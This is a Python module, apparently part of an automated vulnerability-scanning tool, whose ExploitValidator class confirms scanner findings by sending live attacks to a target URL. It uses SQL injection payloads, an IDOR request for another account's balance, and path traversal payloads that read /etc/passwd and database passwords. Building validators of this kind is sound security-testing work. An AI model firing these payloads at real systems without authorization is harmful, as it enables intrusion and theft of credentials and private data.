import requests
import json
import os
import time
from typing import List, Dict, Any, Optional
from .static_scanner import Vulnerability
from exploits import sql_injection, idor, integer_overflow, auth_bypass

class ExploitResult:
    def __init__(self, vuln_id: str, success: bool, response_code: int, response_text: str, payload: Any):
        self.vuln_id = vuln_id
        self.success = success
        self.response_code = response_code
        self.response_text = response_text
        self.payload = payload

class ExploitValidator:
    def __init__(self, target_url: str, logger, memory=None):
        self.target_url = target_url
        self.logger = logger
        self.memory = memory
        self.session = requests.Session()
        self.templates = self._load_templates()

    def _load_templates(self) -> Dict[str, Any]:
        template_path = os.path.join(os.path.dirname(__file__), "..", "config", "attack_templates.json")
        try:
            with open(template_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(f"Failed to load attack templates: {e}")
            return {}

    def validate_exploit(self, vuln: Vulnerability) -> Optional[ExploitResult]:
        """Test if vulnerability is exploitable"""
        self.logger.info(f"ðŸ§ª [EXPLOIT VALIDATOR] Testing {vuln.type} at {vuln.file_path}:{vuln.line_number}...")
        
        result = None
        if vuln.type == "SQL_INJECTION":
            result = self.test_sql_injection(vuln)
        elif vuln.type == "IDOR":
            result = self.test_idor(vuln)
        elif vuln.type == "HARDCODED_SECRET":
            result = self.test_secret_leak(vuln)
        elif vuln.type == "PATH_TRAVERSAL":
            result = self.test_path_traversal(vuln)
        
        if result and result.success:
            self.logger.info(f"âœ… [EXPLOIT VALIDATOR] âœ“ SUCCESS - {vuln.type} verified with payload: {result.payload}")
        elif result:
            self.logger.warning(f"âŒ [EXPLOIT VALIDATOR] Failed to exploit {vuln.type}")
        else:
            self.logger.warning(f"âš ï¸ [EXPLOIT VALIDATOR] No validation handler for {vuln.type}")
            
        return result

    def test_sql_injection(self, vuln: Vulnerability) -> Optional[ExploitResult]:
        """Specific handler for SQLi"""
        endpoint = "/users/1" 
        payloads = self.templates.get("SQL_INJECTION", {}).get("payloads", ["' OR 1=1--"])
        
        for payload in payloads:
            # Layer 4 Integration: Check if this specific payload failed before
            if hasattr(self, 'memory') and self.memory.is_payload_failed("SQL_INJECTION", payload):
                self.logger.info(f"  â€¢ Skipping Payload: {payload} (Known failure)")
                continue

            self.logger.info(f"  â€¢ Testing Payload: {payload}")
            url = f"{self.target_url}{endpoint}{payload}"
            
            # Implementation of Bug #2 Hardening: Retry with exponential backoff
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    res = self.session.get(url, timeout=5)
                    if res.status_code == 200 and ("secret" in res.text or "password" in res.text):
                        return ExploitResult(vuln.vuln_id, True, res.status_code, res.text[:200], payload)
                    else:
                        # Record the failure if we reached here
                        if hasattr(self, 'memory'):
                            self.memory.record_attack("SQL_INJECTION", False, payload)
                        break # Not a connection error, so break retry loop
                except requests.RequestException as e:
                    self.logger.warning(f"  â€¢ Connection attempt {attempt + 1} failed: {e}")
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                    else:
                        self.logger.error(f"  â€¢ Max retries exceeded for SQL_INJECTION")
                        if hasattr(self, 'memory'):
                            self.memory.record_attack("SQL_INJECTION", False, payload)
        
        return ExploitResult(vuln.vuln_id, False, 0, "Failed to exploit", None)

    def test_idor(self, vuln: Vulnerability) -> Optional[ExploitResult]:
        """Specific handler for IDOR with retry logic"""
        endpoint = "/balance/2"
        max_retries = 3
        for attempt in range(max_retries):
            try:
                res = self.session.get(f"{self.target_url}{endpoint}", timeout=5)
                if res.status_code == 200 and "balance" in res.text:
                     return ExploitResult(vuln.vuln_id, True, res.status_code, res.text[:200], "ID_SWITCH_2")
                break
            except requests.RequestException as e:
                self.logger.warning(f"IDOR connection attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                else:
                    self.logger.error(f"Max retries exceeded for IDOR")
            
        return ExploitResult(vuln.vuln_id, False, 0, "IDOR failed", None)

    def test_secret_leak(self, vuln: Vulnerability) -> Optional[ExploitResult]:
        """Test if hardcoded secret can be used for auth"""
        # Simulator logic: If the snippet contains 'secret_key_123', it's valid
        if "secret_key_123" in vuln.code_snippet:
            return ExploitResult(vuln.vuln_id, True, 200, "Secret verified", "secret_key_123")
        return ExploitResult(vuln.vuln_id, False, 0, "Secret invalid", None)

    def test_path_traversal(self, vuln: Vulnerability) -> Optional[ExploitResult]:
        """Specific handler for Path Traversal"""
        payloads = ["../../../etc/passwd", "../../../../etc/passwd"]
        for payload in payloads:
            url = f"{self.target_url}/logs"
            try:
                # Use params to avoid client-side path normalization issues
                res = self.session.get(url, params={"file": payload}, timeout=5)
                if res.status_code == 200 and ("DB_PASSWORD" in res.text or "root:" in res.text):
                     return ExploitResult(vuln.vuln_id, True, res.status_code, res.text[:200], payload)
            except Exception as e:
                self.logger.error(f"Path Traversal validation error: {e}")
        return ExploitResult(vuln.vuln_id, False, 0, "Path Traversal failed", None)
